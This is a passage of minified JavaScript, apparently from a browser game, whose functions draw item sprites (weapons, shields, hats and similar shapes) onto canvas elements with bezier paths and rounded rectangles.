                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 39 * e),
                    r.bezierCurveTo(65.5 * e, 82 * e, 65.5 * e, 82 * e, 79 * e, 125 * e),
                    r.bezierCurveTo(66 * e, 137.5 * e, 66 * e, 137.5 * e, 53 * e, 150 * e),
                    r.bezierCurveTo(39 * e, 138 * e, 39 * e, 138 * e, 25 * e, 126 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 64 * e),
                    r.bezierCurveTo(60 * e, 92.5 * e, 60 * e, 92.5 * e, 68 * e, 121 * e),
                    r.bezierCurveTo(61 * e, 127.5 * e, 61 * e, 127.5 * e, 54 * e, 134 * e),
                    r.bezierCurveTo(46.5 * e, 127.5 * e, 46.5 * e, 127.5 * e, 39 * e, 121 * e),
                    r.closePath(),
                    he(r, i[8]),
                    n
            }
            function jt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 108 * e,
                    n.height = 669 * e,
                    r.translate(20 * e, 20 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(54 * e, 389.5 * e),
                    Ve(r, -15 * e, -228.5 * e, 30 * e, 457 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 579 * e),
                    r.bezierCurveTo(47 * e, 587 * e, 61 * e, 584 * e, 71 * e, 579 * e),
                    r.bezierCurveTo(75 * e, 597.5 * e, 75 * e, 597.5 * e, 79 * e, 616 * e),
                    r.bezierCurveTo(66.5 * e, 628 * e, 66.5 * e, 628 * e, 54 * e, 640 * e),
                    r.bezierCurveTo(41 * e, 628.5 * e, 41 * e, 628.5 * e, 28 * e, 617 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 141 * e),
                    r.bezierCurveTo(40 * e, 136 * e, 40 * e, 136 * e, 50 * e, 131 * e),
                    r.bezierCurveTo(63 * e, 136 * e, 63 * e, 136 * e, 76 * e, 141 * e),
                    r.bezierCurveTo(72.5 * e, 161.5 * e, 72.5 * e, 161.5 * e, 69 * e, 182 * e),
                    r.bezierCurveTo(61.5 * e, 186.5 * e, 61.5 * e, 186.5 * e, 54 * e, 191 * e),
                    r.bezierCurveTo(45 * e, 186.5 * e, 45 * e, 186.5 * e, 36 * e, 182 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42 * e, 152 * e),
                    r.bezierCurveTo(53 * e, 152 * e, 53 * e, 152 * e, 64 * e, 152 * e),
                    r.bezierCurveTo(62 * e, 171 * e, 62 * e, 176 * e, 55 * e, 177 * e),
                    r.bezierCurveTo(42 * e, 176 * e, 45 * e, 174 * e, 42 * e, 152 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 28 * e),
                    r.bezierCurveTo(67.5 * e, 55 * e, 67.5 * e, 55 * e, 83 * e, 82 * e),
                    r.bezierCurveTo(80 * e, 106.5 * e, 80 * e, 106.5 * e, 77 * e, 131 * e),
                    r.bezierCurveTo(58 * e, 147 * e, 44 * e, 141 * e, 29 * e, 131 * e),
                    r.bezierCurveTo(26.5 * e, 106.5 * e, 26.5 * e, 106.5 * e, 24 * e, 82 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(53 * e, 53 * e),
                    r.bezierCurveTo(61 * e, 70 * e, 61 * e, 70 * e, 69 * e, 87 * e),
                    r.bezierCurveTo(67 * e, 106 * e, 67 * e, 106 * e, 65 * e, 125 * e),
                    r.bezierCurveTo(54 * e, 130 * e, 51 * e, 130 * e, 41 * e, 125 * e),
                    r.bezierCurveTo(39 * e, 105 * e, 39 * e, 105 * e, 37 * e, 85 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(-20 * e, -20 * e),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(54 * e, 389.5 * e),
                    r.rotate(0),
                    Ve(r, -15 * e, -228.5 * e, 30 * e, 457 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 579 * e),
                    r.bezierCurveTo(47 * e, 587 * e, 61 * e, 584 * e, 71 * e, 579 * e),
                    r.bezierCurveTo(75 * e, 597.5 * e, 75 * e, 597.5 * e, 79 * e, 616 * e),
                    r.bezierCurveTo(66.5 * e, 628 * e, 66.5 * e, 628 * e, 54 * e, 640 * e),
                    r.bezierCurveTo(41 * e, 628.5 * e, 41 * e, 628.5 * e, 28 * e, 617 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(30 * e, 141 * e),
                    r.bezierCurveTo(40 * e, 136 * e, 40 * e, 136 * e, 50 * e, 131 * e),
                    r.bezierCurveTo(63 * e, 136 * e, 63 * e, 136 * e, 76 * e, 141 * e),
                    r.bezierCurveTo(72.5 * e, 161.5 * e, 72.5 * e, 161.5 * e, 69 * e, 182 * e),
                    r.bezierCurveTo(61.5 * e, 186.5 * e, 61.5 * e, 186.5 * e, 54 * e, 191 * e),
                    r.bezierCurveTo(45 * e, 186.5 * e, 45 * e, 186.5 * e, 36 * e, 182 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(42 * e, 152 * e),
                    r.bezierCurveTo(53 * e, 152 * e, 53 * e, 152 * e, 64 * e, 152 * e),
                    r.bezierCurveTo(62 * e, 171 * e, 62 * e, 176 * e, 55 * e, 177 * e),
                    r.bezierCurveTo(42 * e, 176 * e, 45 * e, 174 * e, 42 * e, 152 * e),
                    r.closePath(),
                    he(r, i[5]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(52 * e, 28 * e),
                    r.bezierCurveTo(67.5 * e, 55 * e, 67.5 * e, 55 * e, 83 * e, 82 * e),
                    r.bezierCurveTo(80 * e, 106.5 * e, 80 * e, 106.5 * e, 77 * e, 131 * e),
                    r.bezierCurveTo(58 * e, 147 * e, 44 * e, 141 * e, 29 * e, 131 * e),
                    r.bezierCurveTo(26.5 * e, 106.5 * e, 26.5 * e, 106.5 * e, 24 * e, 82 * e),
                    r.closePath(),
                    he(r, i[6], i[7], 8 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(53 * e, 53 * e),
                    r.bezierCurveTo(61 * e, 70 * e, 61 * e, 70 * e, 69 * e, 87 * e),
                    r.bezierCurveTo(67 * e, 106 * e, 67 * e, 106 * e, 65 * e, 125 * e),
                    r.bezierCurveTo(54 * e, 130 * e, 51 * e, 130 * e, 41 * e, 125 * e),
                    r.bezierCurveTo(39 * e, 105 * e, 39 * e, 105 * e, 37 * e, 85 * e),
                    r.closePath(),
                    he(r, i[8]),
                    n
            }
            function qt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 43 * e,
                    n.height = 209 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 10 * e),
                    r.translate(5 * e, 5 * e),
                    r.save(),
                    r.translate(21 * e, 102.5 * e),
                    Ve(r, -4 * e, -76.5 * e, 8 * e, 163 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.translate(0, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(20 * e, 10 * e),
                    r.bezierCurveTo(25 * e, 25.5 * e, 25 * e, 25.5 * e, 30 * e, 41 * e),
                    r.bezierCurveTo(25.5 * e, 38.5 * e, 25.5 * e, 38.5 * e, 21 * e, 36 * e),
                    r.bezierCurveTo(16 * e, 38.5 * e, 16 * e, 38.5 * e, 11 * e, 41 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(21 * e, +e),
                    r.bezierCurveTo(28 * e, 18 * e, 28 * e, 18 * e, 35 * e, 35 * e),
                    r.bezierCurveTo(28.5 * e, 32 * e, 28.5 * e, 32 * e, 22 * e, 29 * e),
                    r.bezierCurveTo(14.5 * e, 32.5 * e, 14.5 * e, 32.5 * e, 7 * e, 36 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(14 * e, 146 * e),
                    r.bezierCurveTo(21 * e, 146 * e, 21 * e, 146 * e, 28 * e, 146 * e),
                    r.bezierCurveTo(27.5 * e, 147.5 * e, 27.5 * e, 147.5 * e, 27 * e, 149 * e),
                    r.bezierCurveTo(27 * e, 160 * e, 27 * e, 160 * e, 27 * e, 171 * e),
                    r.bezierCurveTo(27.5 * e, 171.5 * e, 27.5 * e, 171.5 * e, 28 * e, 172 * e),
                    r.bezierCurveTo(21 * e, 172 * e, 21 * e, 172 * e, 14 * e, 172 * e),
                    r.bezierCurveTo(14 * e, 171.5 * e, 14 * e, 171.5 * e, 14 * e, 171 * e),
                    r.bezierCurveTo(14.5 * e, 171.5 * e, 14.5 * e, 171.5 * e, 15 * e, 172 * e),
                    r.bezierCurveTo(15 * e, 160.5 * e, 15 * e, 160.5 * e, 15 * e, 149 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(21 * e, 6 * e),
                    r.bezierCurveTo(26.5 * e, 18.5 * e, 26.5 * e, 18.5 * e, 32 * e, 31 * e),
                    r.bezierCurveTo(27 * e, 29 * e, 27 * e, 29 * e, 22 * e, 27 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.translate(0, -20 * e),
                    r.globalAlpha = 1,
                    r.translate(0, 10 * e),
                    r.translate(-5 * e, -5 * e),
                    r.save(),
                    r.translate(21 * e, 102.5 * e),
                    Ve(r, -4 * e, -76.5 * e, 8 * e, 163 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4 * e),
                    r.translate(0, 10 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(20 * e, 10 * e),
                    r.bezierCurveTo(25 * e, 25.5 * e, 25 * e, 25.5 * e, 30 * e, 41 * e),
                    r.bezierCurveTo(25.5 * e, 38.5 * e, 25.5 * e, 38.5 * e, 21 * e, 36 * e),
                    r.bezierCurveTo(16 * e, 38.5 * e, 16 * e, 38.5 * e, 11 * e, 41 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(21 * e, +e),
                    r.bezierCurveTo(28 * e, 18 * e, 28 * e, 18 * e, 35 * e, 35 * e),
                    r.bezierCurveTo(28.5 * e, 32 * e, 28.5 * e, 32 * e, 22 * e, 29 * e),
                    r.bezierCurveTo(14.5 * e, 32.5 * e, 14.5 * e, 32.5 * e, 7 * e, 36 * e),
                    r.closePath(),
                    he(r, i[5], i[6], 4 * e),
                    r.translate(0, 0 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(14 * e, 146 * e),
                    r.bezierCurveTo(21 * e, 146 * e, 21 * e, 146 * e, 28 * e, 146 * e),
                    r.bezierCurveTo(27.5 * e, 147.5 * e, 27.5 * e, 147.5 * e, 27 * e, 149 * e),
                    r.bezierCurveTo(27 * e, 160 * e, 27 * e, 160 * e, 27 * e, 171 * e),
                    r.bezierCurveTo(27.5 * e, 171.5 * e, 27.5 * e, 171.5 * e, 28 * e, 172 * e),
                    r.bezierCurveTo(21 * e, 172 * e, 21 * e, 172 * e, 14 * e, 172 * e),
                    r.bezierCurveTo(14 * e, 171.5 * e, 14 * e, 171.5 * e, 14 * e, 171 * e),
                    r.bezierCurveTo(14.5 * e, 171.5 * e, 14.5 * e, 171.5 * e, 15 * e, 172 * e),
                    r.bezierCurveTo(15 * e, 160.5 * e, 15 * e, 160.5 * e, 15 * e, 149 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(21 * e, 6 * e),
                    r.bezierCurveTo(26.5 * e, 18.5 * e, 26.5 * e, 18.5 * e, 32 * e, 31 * e),
                    r.bezierCurveTo(27 * e, 29 * e, 27 * e, 29 * e, 22 * e, 27 * e),
                    r.closePath(),
                    he(r, i[8]),
                    n
            }
            function Zt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 200 * e,
                    n.height = 200 * e,
                    r.save(),
                    r.translate(112 * e, 158 * e),
                    Ve(r, -86.5 * e, -86 * e, 150 * e, 35 * e, 20 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(170 * e, 100 * e),
                    Ve(r, -86.5 * e, -86 * e, 35 * e, 150 * e, 20 * e),
                    r.restore(),
                    he(r, i[0]),
                    n
            }
            function Qt(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 165 * e,
                    n.height = 123 * e,
                    r.save(),
                    r.translate(81 * e, 65 * e),
                    Ve(r, -78 * e, -54.5 * e, 156 * e, 109 * e, 20 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(81 * e, 58 * e),
                    Ve(r, -78 * e, -54.5 * e, 156 * e, 109 * e, 20 * e),
                    r.restore(),
                    he(r, i[1], i[2], 4),
                    r.save(),
                    r.translate(81 * e, 58 * e),
                    Ve(r, -69 * e, -47 * e, 138 * e, 93 * e, 15 * e),
                    r.restore(),
                    he(r, i[3], i[4], 4),
                    r.save(),
                    r.translate(79 * e, 54 * e),
                    Ve(r, -34 * e, -40 * e, 68 * e, 88 * e, 13 * e),
                    r.restore(),
                    he(r, void 0, i[5], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(44 * e, 13 * e),
                    r.bezierCurveTo(43.5 * e, 55 * e, 43.5 * e, 55 * e, 43 * e, 101 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(115 * e, 13 * e),
                    r.bezierCurveTo(115 * e, 56 * e, 115 * e, 56 * e, 115 * e, 101 * e),
                    r.closePath(),
                    he(r, void 0, i[6], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(35 * e, 6 * e),
                    r.bezierCurveTo(35 * e, 56 * e, 36 * e, 109 * e, 35 * e, 110 * e),
                    r.closePath(),
                    he(r, void 0, i[7], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(123 * e, 6 * e),
                    r.bezierCurveTo(123 * e, 56 * e, 123 * e, 56 * e, 123 * e, 110 * e),
                    r.closePath(),
                    he(r, void 0, i[7], 4),
                    r.save(),
                    r.translate(79 * e, 113 * e),
                    Ve(r, -18 * e, -2 * e, 36 * e, 4 * e, 20 * e),
                    r.restore(),
                    he(r, void 0, i[8], 4),
                    r.save(),
                    r.translate(75 * e, 118 * e),
                    Ve(r, -6 * e, -2.5 * e, 20 * e, 5 * e, 20 * e),
                    r.restore(),
                    he(r, i[8]),
                    n
            }
            function $t(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 92 * e,
                    n.height = 108 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(31 * e, 10 * e),
                    r.bezierCurveTo(37 * e, 2 * e, 49 * e, 0 * e, 61 * e, 15 * e),
                    r.bezierCurveTo(81 * e, 31 * e, 78 * e, 25 * e, 79 * e, 37 * e),
                    r.bezierCurveTo(76 * e, 44 * e, 81 * e, 56 * e, 85 * e, 63 * e),
                    r.bezierCurveTo(91 * e, 71 * e, 90 * e, 78 * e, 83 * e, 84 * e),
                    r.bezierCurveTo(60 * e, 98 * e, 67 * e, 95 * e, 57 * e, 102 * e),
                    r.bezierCurveTo(47 * e, 106 * e, 43 * e, 106 * e, 31 * e, 98 * e),
                    r.bezierCurveTo(22 * e, 91 * e, 17 * e, 89 * e, 7 * e, 84 * e),
                    r.bezierCurveTo(+e, 77 * e, 4 * e, 73 * e, 7 * e, 60 * e),
                    r.bezierCurveTo(11 * e, 50 * e, 5 * e, 32 * e, 15 * e, 27 * e),
                    r.bezierCurveTo(26 * e, 18 * e, 26 * e, 24 * e, 31 * e, 10 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4),
                    n
            }
            function ei(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 151 * e,
                    n.height = 80 * e,
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(133 * e, 54 * e),
                    r.bezierCurveTo(136 * e, 18 * e, 129 * e, 18 * e, 114 * e, 13 * e),
                    r.bezierCurveTo(51 * e, 0 * e, 36 * e, 16 * e, 34 * e, 16 * e),
                    r.bezierCurveTo(8 * e, 28 * e, 22 * e, 56 * e, 21 * e, 57 * e),
                    r.closePath(),
                    he(r, i[2], i[3], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(130 * e, 40 * e),
                    r.bezierCurveTo(132 * e, 35 * e, 132 * e, 30 * e, 132 * e, 29 * e),
                    r.bezierCurveTo(145 * e, 38 * e, 144 * e, 43 * e, 137 * e, 54 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(20 * e, 33 * e),
                    r.bezierCurveTo(24 * e, 44 * e, 215 * e, 39 * e, 23 * e, 44 * e),
                    r.bezierCurveTo(19 * e, 49 * e, 19 * e, 49 * e, 15 * e, 54 * e),
                    r.bezierCurveTo(4 * e, 43 * e, 10 * e, 35 * e, 20 * e, 32 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(18 * e, 52 * e),
                    r.bezierCurveTo(24 * e, 31 * e, 34 * e, 25 * e, 75 * e, 23 * e),
                    r.bezierCurveTo(130 * e, 24 * e, 129 * e, 32 * e, 134 * e, 51 * e),
                    r.bezierCurveTo(138 * e, 70 * e, 126 * e, 72 * e, 90 * e, 73 * e),
                    r.bezierCurveTo(18 * e, 72 * e, 15 * e, 68 * e, 18 * e, 54 * e),
                    r.closePath(),
                    he(r, i[0], i[1], 4),
                    n
            }
            function ti(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 138 * e,
                    n.height = 133 * e,
                    r.globalAlpha = t ? .3 : 1,
                    r.translate(0, 5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(26 * e, 79.640625 * e),
                    r.bezierCurveTo(13 * e, 84.640625 * e, 9 * e, 86.640625 * e, 7 * e, 78.640625 * e),
                    r.bezierCurveTo(6 * e, 69.640625 * e, 15 * e, 67.640625 * e, 31 * e, 62.640625 * e),
                    r.bezierCurveTo(63 * e, 55.640625 * e, 85 * e, 57.640625 * e, 104 * e, 63.640625 * e),
                    r.bezierCurveTo(131 * e, 69.640625 * e, 132 * e, 71.640625 * e, 131 * e, 78.640625 * e),
                    r.bezierCurveTo(131 * e, 91.640625 * e, 112 * e, 80.640625 * e, 91 * e, 75.640625 * e),
                    r.bezierCurveTo(51 * e, 70.640625 * e, 45 * e, 74.640625 * e, 28 * e, 78.640625 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(8 * e, 82.640625 * e),
                    r.bezierCurveTo(40 * e, 107.640625 * e, 53 * e, 104.640625 * e, 67 * e, 106.640625 * e),
                    r.bezierCurveTo(101 * e, 103.640625 * e, 117 * e, 93.640625 * e, 127 * e, 84.640625 * e),
                    r.bezierCurveTo(135 * e, 95.640625 * e, 131 * e, 107.640625 * e, 110 * e, 118.640625 * e),
                    r.bezierCurveTo(78 * e, 129.640625 * e, 67 * e, 130.640625 * e, 27 * e, 119.640625 * e),
                    r.bezierCurveTo(0 * e, 105.640625 * e, 8 * e, 83.640625 * e, 10 * e, 84.640625 * e),
                    r.closePath(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -5 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(8 * e, 73.640625 * e),
                    r.bezierCurveTo(7 * e, 23.640625 * e, 33 * e, 19.640625 * e, 71 * e, 17.640625 * e),
                    r.bezierCurveTo(129 * e, 19.640625 * e, 130 * e, 45.640625 * e, 130 * e, 76.640625 * e),
                    r.bezierCurveTo(90 * e, 63.640625 * e, 85 * e, 63.640625 * e, 73 * e, 63.640625 * e),
                    r.bezierCurveTo(38 * e, 63.640625 * e, 33 * e, 66.640625 * e, 8 * e, 73.640625 * e),
                    r.closePath(),
                    he(r, i[1], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(72 * e, 28.640625 * e),
                    r.bezierCurveTo(51 * e, 25.640625 * e, 56 * e, 7.640625 * e, 70 * e, 5.640625 * e),
                    r.bezierCurveTo(94 * e, 7.640625 * e, 87 * e, 29.640625 * e, 72 * e, 28.640625 * e),
                    r.closePath(),
                    he(r, i[3], i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(51 * e, 26.640625 * e),
                    r.bezierCurveTo(42 * e, 29.640625 * e, 43 * e, 31.640625 * e, 42 * e, 37.640625 * e),
                    he(r, void 0, i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(90 * e, 26.640625 * e),
                    r.bezierCurveTo(100 * e, 28.640625 * e, 98 * e, 34.640625 * e, 99 * e, 38.640625 * e),
                    he(r, void 0, i[2], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(26 * e, 79.640625 * e),
                    r.bezierCurveTo(13 * e, 84.640625 * e, 9 * e, 86.640625 * e, 7 * e, 78.640625 * e),
                    r.bezierCurveTo(6 * e, 69.640625 * e, 15 * e, 67.640625 * e, 31 * e, 62.640625 * e),
                    r.bezierCurveTo(63 * e, 55.640625 * e, 85 * e, 57.640625 * e, 104 * e, 63.640625 * e),
                    r.bezierCurveTo(131 * e, 69.640625 * e, 132 * e, 71.640625 * e, 131 * e, 78.640625 * e),
                    r.bezierCurveTo(131 * e, 91.640625 * e, 112 * e, 80.640625 * e, 91 * e, 75.640625 * e),
                    r.bezierCurveTo(51 * e, 70.640625 * e, 45 * e, 74.640625 * e, 28 * e, 78.640625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    r.beginPath(),
                    r.lineCap = "round",
                    r.lineJoin = "round",
                    r.moveTo(8 * e, 82.640625 * e),
                    r.bezierCurveTo(40 * e, 107.640625 * e, 53 * e, 104.640625 * e, 67 * e, 106.640625 * e),
                    r.bezierCurveTo(101 * e, 103.640625 * e, 117 * e, 93.640625 * e, 127 * e, 84.640625 * e),
                    r.bezierCurveTo(135 * e, 95.640625 * e, 131 * e, 107.640625 * e, 110 * e, 118.640625 * e),
                    r.bezierCurveTo(78 * e, 129.640625 * e, 67 * e, 130.640625 * e, 27 * e, 119.640625 * e),
                    r.bezierCurveTo(0 * e, 105.640625 * e, 8 * e, 83.640625 * e, 10 * e, 84.640625 * e),
                    r.closePath(),
                    he(r, i[3], i[4], 4 * e),
                    n
            }
            function ii(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d")
                    , o = 170 * e
                    , a = 172 * e
                    , s = o / 2
                    , _ = a / 2;
                n.width = o,
                    n.height = a,
                    r.translate(s, _ + 7 * e),
                    r.globalAlpha = t ? .5 : 0,
                    ke(r, 0, 0, 60 * e),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(0, -7 * e),
                    r.save();
                for (var E = 0; E < 10; E++)
                    r.rotate(Math.PI / 5),
                        r.save(),
                        r.translate(65 * e, 0),
                        A(r, 3, 20 * e, 4 * e),
                        he(r, i[1], i[2], 4 * e),
                        r.restore();
                return r.restore(),
                    ke(r, 0, 0, 60 * e),
                    he(r, i[3], i[4], 4 * e),
                    ke(r, 0, 0, 40 * e),
                    he(r, i[5]),
                    ke(r, 0, 0, 25 * e),
                    he(r, i[6], i[7], 8 * e),
                    n
            }
            function ni(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                n.width = 170 * e,
                    n.height = 170 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 5 * e),
                    r.save(),
                    r.translate(85 * e, 88 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(85 * e, 80 * e);
                for (var o = 0; o < 10; o++)
                    r.rotate(Math.PI / 5),
                        r.save(),
                        r.translate(65 * e, 0),
                        A(r, 3, 21 * e, 4 * e),
                        he(r, i[1], i[2], 4 * e),
                        r.restore();
                return r.save(),
                    r.translate(0 * e, 0 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    r.rotate(.64),
                    A(r, 7, 40 * e, 10 * e),
                    he(r, i[5], i[6], 4 * e),
                    r.rotate(.12),
                    A(r, 7, 23 * e, 5 * e),
                    r.restore(),
                    he(r, i[7]),
                    n
            }
            function ri(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                n.width = 170 * e,
                    n.height = 170 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.translate(0, 3 * e),
                    r.save(),
                    r.translate(85 * e, 95 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(85 * e, 82 * e);
                for (var o = 0; o < 10; o++)
                    r.rotate(Math.PI / 5),
                        r.save(),
                        r.translate(65 * e, 0),
                        A(r, 3, 21 * e, 4 * e),
                        he(r, i[1], i[2], 4 * e),
                        r.restore();
                return r.save(),
                    r.translate(0 * e, 0 * e),
                    r.rotate(1),
                    A(r, 8, 60 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    r.rotate(.56),
                    A(r, 8, 40 * e, 10 * e),
                    he(r, i[5], i[6], 4 * e),
                    r.rotate(.28),
                    A(r, 8, 28 * e, 8 * e),
                    he(r, i[7]),
                    r.restore(),
                    n
            }
            function oi(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                n.width = 170 * e,
                    n.height = 170 * e,
                    r.translate(0, 3 * e),
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(85 * e, 95 * e),
                    r.rotate(1.4),
                    A(r, 7, 60 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.translate(85 * e, 82 * e);
                for (var o = 0; o < 10; o++)
                    r.rotate(Math.PI / 5),
                        r.save(),
                        r.translate(65 * e, 0),
                        A(r, 3, 21 * e, 4 * e),
                        he(r, i[1], i[2], 4 * e),
                        r.restore();
                return r.save(),
                    r.translate(0 * e, 0 * e),
                    r.rotate(.2),
                    A(r, 9, 60 * e, 10 * e),
                    he(r, i[3], i[4], 4 * e),
                    r.rotate(-.32),
                    A(r, 9, 38 * e, 10 * e),
                    he(r, i[5], i[6], 4 * e),
                    r.rotate(.68),
                    A(r, 9, 20 * e, 8 * e),
                    he(r, i[7], i[8], 6 * e),
                    r.restore(),
                    n
            }
            function ai(e, t, i) {
                var n = document.createElement("canvas")
                    , r = n.getContext("2d");
                return n.width = 69 * e,
                    n.height = 120 * e,
                    r.globalAlpha = t ? .5 : 1,
                    r.save(),
                    r.translate(30 * e, 84 * e),
                    Ve(r, -6 * e, -66.5 * e, 8 * e, 100 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(30 * e, 45 * e),
                    Ve(r, -9.5 * e, -6.5 * e, 16 * e, 13 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(30 * e, 17 * e),
                    Ve(r, -7.5 * e, -5.5 * e, 12 * e, 11 * e, 10 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.save(),
                    r.translate(30 * e, 31 * e),
                    Ve(r, -26 * e, -14.5 * e, 52 * e, 29 * e, 5 * e),
                    r.restore(),
                    he(r, i[0]),
                    r.globalAlpha = 1,
                    r.save(),
                    r.translate(36 * e, 79.140625 * e),
                    Ve(r, -6 * e, -66.5 * e, 8 * e, 100 * e, 10 * e),
                    r.restore(),
                    he(r, i[1], i[2], 3 * e),
                    r.save(),
                    r.translate(35 * e, 40.140625 * e),
                    Ve(r, -9.5 * e, -6.5 * e, 16 * e, 13 * e, 10 * e),
                    r.restore(),
                    he(r, i[3], i[4], 3 * e),
                    r.save(),
